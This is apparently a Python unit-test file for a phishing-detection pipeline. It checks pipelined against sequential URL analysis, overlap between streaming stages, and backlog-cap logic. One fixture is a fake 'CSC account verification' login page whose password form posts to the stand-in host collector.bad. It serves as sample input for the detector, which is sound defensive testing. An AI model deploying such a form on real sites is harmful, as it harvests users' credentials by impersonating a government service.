import asyncio
import unittest
from unittest import mock

import httpx

from phishing_pipeline import comparison
from phishing_pipeline.config import resolve_stage1_http_config
from phishing_pipeline.stage1_http_analyzer import (
    _default_stage1_result,
    analyze_stage1_url,
)


def _entity_context():
    ordered_entities = ("CSC",)
    context = {
        "CSC": {
            "aliases": (
                "csc",
                "common service centre",
                "common service center",
            ),
            "domains": ("csc.gov.in",),
        }
    }
    return context, ordered_entities


class Stage1StreamingPipelineTests(unittest.IsolatedAsyncioTestCase):
    async def test_pipelined_stage1_matches_sequential_analysis(self):
        entity_context, ordered_entities = _entity_context()
        urls = [
            "https://benign.example.org",
            "https://csc-login.example.org",
            "https://fail.example.org",
        ]
        stage1_http_config = resolve_stage1_http_config(
            {
                "concurrency": 2,
                "http_concurrency": 4,
                "dns_concurrency": 4,
                "rdap_concurrency": 2,
                "tls_concurrency": 2,
                "stage1_fetch_concurrency_start": 2,
                "stage1_fetch_concurrency_max": 4,
                "stage1_http_connection_limit": 4,
                "stage1_http_keepalive_limit": 2,
                "stage1_parse_workers": 2,
                "stage1_enrich_dns_concurrency": 4,
                "stage1_enrich_rdap_concurrency": 2,
                "stage1_enrich_tls_concurrency": 2,
                "stage1_fetch_queue_max": 8,
                "stage1_parse_queue_max": 8,
                "stage1_score_queue_max": 8,
                "stage1_enrich_queue_max": 8,
                "stage1_result_queue_max": 8,
            }
        )

        async def fake_fetch(url, client, **kwargs):
            result = _default_stage1_result(url)
            normalized_url = comparison.normalize_url(url)
            domain = normalized_url.split("//", 1)[-1]
            if "fail." in domain:
                result.update(
                    {
                        "fetch_status": "failed",
                        "fetch_error_type": "ConnectTimeout",
                        "fetch_error_detail": "ConnectTimeout",
                        "stage1_error_type": "ConnectTimeout",
                        "stage1_error_message": "ConnectTimeout",
                    }
                )
                return {
                    "result": result,
                    "html_bytes": b"",
                    "response_encoding": None,
                }
            html = (
                b"<html><title>District bulletin</title><body>Weekly public notice.</body></html>"
                if "benign." in domain
                else b"<html><title>CSC account verification</title><body><form action='https://collector.bad/submit'><input type='password'/><button>Login to CSC</button></form></body></html>"
            )
            result.update(
                {
                    "fetch_status": "fetched",
                    "status_code": 200,
                    "final_landing_url": normalized_url,
                    "final_domain": normalized_url.split("//", 1)[-1],
                    "content_type": "text/html",
                }
            )
            return {
                "result": result,
                "html_bytes": html,
                "response_encoding": "utf-8",
            }

        async def fake_enrich(result, client, **kwargs):
            enriched = dict(result)
            enriched.update(
                {
                    "resolved_ips": ["1.2.3.4"],
                    "dns_answer_count": 1,
                    "asn_org": "Namecheap, Inc.",
                    "rdap_creation_date": "2026-01-01T00:00:00Z",
                    "rdap_age_days": 5,
                    "cert_cn": str(result.get("final_domain", "")),
                    "cert_issuer": "Let's Encrypt",
                }
            )
            return enriched

        with (
            mock.patch.object(comparison, "fetch_stage1_http_artifacts", side_effect=fake_fetch),
            mock.patch("phishing_pipeline.stage1_http_analyzer.fetch_stage1_http_artifacts", side_effect=fake_fetch),
            mock.patch.object(comparison, "enrich_stage1_result", side_effect=fake_enrich),
            mock.patch("phishing_pipeline.stage1_http_analyzer.enrich_stage1_result", side_effect=fake_enrich),
            mock.patch.object(comparison, "get_stage1_entity_context", return_value=(entity_context, ordered_entities)),
            mock.patch("phishing_pipeline.stage1_http_analyzer.get_stage1_entity_context", return_value=(entity_context, ordered_entities)),
        ):
            pipelined = await comparison._analyze_stage1_http_candidates_pipelined(
                urls,
                stage1_http_config=stage1_http_config,
            )

            expected = {}
            async with httpx.AsyncClient() as client:
                for url in urls:
                    sequential = await analyze_stage1_url(
                        url,
                        client,
                        entity_context=entity_context,
                        ordered_entities=ordered_entities,
                        config=stage1_http_config,
                    )
                    sequential["stage1_timeout_hit"] = bool(
                        sequential.get("stage1_timeout_hit", False)
                        or comparison._stage1_timeout_flag_from_message(
                            sequential.get("stage1_error_message", ""),
                            sequential.get("fetch_error_detail", ""),
                        )
                    )
                    expected[comparison.normalize_url(url)] = {
                        **comparison._stage1_signal_defaults(),
                        **sequential,
                    }

        self.assertEqual(expected, pipelined)

    async def test_streaming_shortlist_overlaps_stage0_stage1_and_hash(self):
        states = {
            "stage0_done": False,
            "stage1_done": False,
            "stage1_started_before_stage0_done": False,
            "hash_started_before_stage1_done": False,
        }

        async def fake_stage0_stream(metric_urls, scoring_config, *, on_batch_complete=None, **kwargs):
            await on_batch_complete(
                [comparison.normalize_url("https://miss.example.org")],
                [
                    {
                        "strict_lexical_hit": False,
                        "lexical_score_pass": False,
                        "fallback_rank_only": False,
                        "source_workbook": "",
                    }
                ],
            )
            await asyncio.sleep(0.05)
            states["stage0_done"] = True
            return {
                "metric_urls_total": 1,
                "metric_urls_completed": 1,
                "input_urls_completed": 1,
                "batches_total": 1,
                "batches_completed": 1,
                "avg_batch_latency_ms": 1.0,
            }

        async def fake_stage1_pipeline(*, ingress_queue, producer_done_event, progress, stage1_analysis_map, on_admit=None, admitted_urls=None, **kwargs):
            states["stage1_started_before_stage0_done"] = not states["stage0_done"]
            item = await ingress_queue.get()
            normalized_url = item["normalized_url"]
            stage1_analysis_map[normalized_url] = {
                **comparison._stage1_signal_defaults(),
                "fetch_status": "fetched",
                "escalate_to_hashing": True,
                "escalate_reason": "test",
            }
            progress.mark_completed(final_status="stage1_completed")
            if admitted_urls is not None:
                admitted_urls.append(item["raw_url"])
            if on_admit is not None:
                await on_admit(item["raw_url"], normalized_url, stage1_analysis_map[normalized_url])
            ingress_queue.task_done()
            await asyncio.sleep(0.05)
            states["stage1_done"] = True
            return {
                "results": stage1_analysis_map,
                "progress": {},
                "elapsed_s": 0.1,
                "fetch_limit": 1,
                "queue_snapshot": {},
            }

        async def fake_run_browser_shard(*args, **kwargs):
            url_queue = args[1]
            while True:
                item = await url_queue.get()
                if item is None:
                    url_queue.task_done()
                    break
                states["hash_started_before_stage1_done"] = not states["stage1_done"]
                url_queue.task_done()

        async def fake_gpu_scorer(gpu_queue, *args, **kwargs):
            while True:
                item = await gpu_queue.get()
                gpu_queue.task_done()
                if item is None:
                    break

        with (
            mock.patch.object(comparison, "_compute_stage0_prefetch_metrics_parallel_streaming", side_effect=fake_stage0_stream),
            mock.patch.object(comparison, "_run_stage1_http_pipeline", side_effect=fake_stage1_pipeline),
            mock.patch.object(comparison, "_run_browser_shard", side_effect=fake_run_browser_shard),
            mock.patch.object(comparison, "_gpu_microbatch_scorer", side_effect=fake_gpu_scorer),
            mock.patch.object(comparison, "_finish_hashing_shortlist_output", return_value={"done": True}),
            mock.patch.object(comparison, "BROWSER_SHARDS", 1),
            mock.patch.object(comparison, "SCRAPER_PAGE_CONCURRENCY", 1),
            mock.patch.object(comparison, "_has_aiohttp", False),
        ):
            result = await comparison.run_hashing_shortlist_streaming(["https://miss.example.org"])

        self.assertEqual({"done": True}, result)
        self.assertTrue(states["stage1_started_before_stage0_done"])
        self.assertTrue(states["hash_started_before_stage1_done"])

    def test_hash_stage1_backlog_cap_uses_stage1_queue_pressure(self):
        self.assertEqual(
            32,
            comparison._compute_hash_stage1_backlog_cap(
                full_limit=64,
                stage1_snapshot={"queue_pressure_ratio": 0.80},
                stage1_done=False,
            ),
        )
        self.assertEqual(
            48,
            comparison._compute_hash_stage1_backlog_cap(
                full_limit=64,
                stage1_snapshot={"queue_pressure_ratio": 0.45},
                stage1_done=False,
            ),
        )
        self.assertEqual(
            64,
            comparison._compute_hash_stage1_backlog_cap(
                full_limit=64,
                stage1_snapshot={"queue_pressure_ratio": 0.90},
                stage1_done=True,
            ),
        )


if __name__ == "__main__":
    unittest.main()
